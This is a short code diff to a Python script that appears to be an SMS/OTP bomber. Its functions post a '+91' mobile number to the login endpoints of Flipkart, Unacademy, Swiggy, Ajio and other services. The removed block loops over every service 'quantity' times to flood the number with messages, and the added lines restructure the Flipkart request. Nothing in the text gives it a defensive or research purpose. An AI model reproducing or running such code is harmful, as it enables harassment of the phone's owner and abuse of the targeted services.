@@ -32,12 +32,14 @@ def flipkart_api():
 
 	data = {"loginId":"+91"+mobno}
 	
-	request = rq.post(url, headers=_headers, json=data)
 
-	if request.status_code == 200:
-		print('Success - Flipkart')
-	else:
-		print('Failed - Flipkart')
+	if True:
+		request = rq.post(url, headers=_headers, json=data)
+		if request.status_code == 200:
+			print('Success - Flipkart')
+			return True
+		else:
+			print('Failed - Flipkart')
 
 
 def unacademy_api():
@@ -238,15 +240,3 @@ def ajio_api():
 		print('Success - Ajio')
 	else:
 		print('Failed - Ajio')
-
-
-
-
-for x in range(0,quantity):
-	flipkart_api()
-	unacademy_api()
-	confirmtkt_api()
-	swiggy_api()
-	vedantu_api()
-	justdial_api()
-	ajio_api()
